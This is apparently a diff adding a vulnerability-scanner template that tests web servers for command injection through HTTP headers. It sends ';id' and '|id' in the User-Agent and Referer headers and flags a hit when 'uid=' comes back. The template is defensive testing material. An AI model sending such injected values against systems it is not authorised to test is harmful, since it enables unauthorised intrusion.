@@ -1,0 +1,21 @@
+id: header-command-injection
+
+info:
+  name: Header Command Injection Test
+  author: loca
+  severity: critical
+  tags: rce,header,test
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      User-Agent: ";id"
+      Referer: "|id"
+
+    matchers:
+      - type: word
+        words:
+          - "uid="
